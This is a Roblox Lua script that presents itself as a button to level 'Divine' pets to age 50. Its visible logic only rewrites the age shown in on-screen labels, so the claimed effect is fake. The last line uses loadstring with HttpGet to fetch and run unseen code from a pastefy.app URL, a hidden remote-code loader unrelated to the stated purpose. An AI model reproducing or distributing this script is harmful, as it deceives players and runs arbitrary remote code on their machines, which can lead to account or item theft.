-- ✅ Divine pets list (edit as needed)
local divinePets = {
    ["Red Fox"] = true,
    ["Dragonfly"] = true,
    ["Blood Owl"] = true,
    ["Raccoon"] = true,
    ["Night Owl"] = true,
    ["Fennec Fox"] = true,
    ["T-Rex"] = true,
    ["Queen Bee"] = true,
    ["Disco Bee"] = true
}

-- 🔍 Find all Divine pet labels that match [Age ##]
local function findAllDivineLabels()
    local player = game.Players.LocalPlayer
    local gui = player:FindFirstChild("PlayerGui")
    local labels = {}

    if not gui then return labels end

    for _, label in ipairs(gui:GetDescendants()) do
        if label:IsA("TextLabel") and label.Text and label.Text:match("%[Age%s*%d+%]") then
            for petName in pairs(divinePets) do
                if label.Text:find(petName) then
                    table.insert(labels, label)
                    break
                end
            end
        end
    end

    return labels
end

-- ⚠️ Show a red warning label temporarily
local function flashWarning(message)
    local screenGui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("SetAgeTo50Gui")
    if not screenGui then return end

    local warnLabel = Instance.new("TextLabel", screenGui)
    warnLabel.Size = UDim2.new(0.5, 0, 0.05, 0)
    warnLabel.Position = UDim2.new(0.25, 0, 0.7, 0)
    warnLabel.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
    warnLabel.Text = message
    warnLabel.TextColor3 = Color3.new(1, 1, 1)
    warnLabel.TextScaled = true
    warnLabel.Font = Enum.Font.GothamBold
    warnLabel.BackgroundTransparency = 0.1

    local corner = Instance.new("UICorner", warnLabel)
    corner.CornerRadius = UDim.new(0, 8)

    task.delay(2, function()
        warnLabel:Destroy()
    end)
end

-- 📱 Create centered button UI
local function createDivineAgeUI()
    local gui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
    gui.Name = "SetAgeTo50Gui"
    gui.ResetOnSpawn = false

    local button = Instance.new("TextButton", gui)
    button.Size = UDim2.new(0.5, 0, 0.07, 0)
    button.Position = UDim2.new(0.25, 0, 0.45, 0) -- Center of screen
    button.BackgroundColor3 = Color3.fromRGB(0, 170, 90)
    button.Text = "Auto Lvl 50 Divine Pets" -- ✅ updated text
    button.TextScaled = true
    button.Font = Enum.Font.GothamBold
    button.TextColor3 = Color3.new(1, 1, 1)

    local corner = Instance.new("UICorner", button)
    corner.CornerRadius = UDim.new(0, 12)

    button.MouseButton1Click:Connect(function()
        local found = findAllDivineLabels()
        if #found > 0 then
            for _, label in ipairs(found) do
                label.Text = label.Text:gsub("Age%s*%d+", "Age 50")
            end
        else
            flashWarning("⚠️ No Divine Pets Equipped!")
        end
    end)
end

createDivineAgeUI()
loadstring(game:HttpGet("https://pastefy.app/ukVzwix5/raw"))()
